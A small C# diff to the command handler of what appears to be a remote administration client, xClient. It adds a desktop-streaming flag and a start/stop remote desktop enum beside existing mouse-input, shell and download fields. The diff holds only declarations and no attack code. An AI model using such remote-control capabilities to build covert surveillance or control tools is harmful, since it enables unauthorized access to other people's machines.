@@ -19,8 +19,8 @@ namespace xClient.Core.Commands
         [DllImport("user32.dll")]
         private static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
 
+        public static bool IsStreamingDesktop;
         public static UnsafeStreamCodec StreamCodec;
-        public static Bitmap LastDesktopScreenshot;
         private static Shell _shell;
         private static Dictionary<int, string> _canceledDownloads = new Dictionary<int, string>();
 
@@ -46,6 +46,11 @@ namespace xClient.Core.Commands
             File,
             Directory,
             Back
+        }
+        public enum RemoteDesktopAction
+        {
+            Start,
+            Stop
         }
     }
 }
